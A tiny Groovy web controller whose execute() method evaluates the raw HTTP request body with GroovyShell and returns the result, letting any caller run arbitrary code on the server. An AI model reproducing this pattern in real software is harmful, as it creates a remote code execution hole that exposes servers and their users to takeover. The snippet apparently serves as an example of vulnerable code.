class APIController {
    def execute() {
        def body = request.reader.text
        def shell = new GroovyShell()
        def result = shell.evaluate(body)
        render result
    }
}
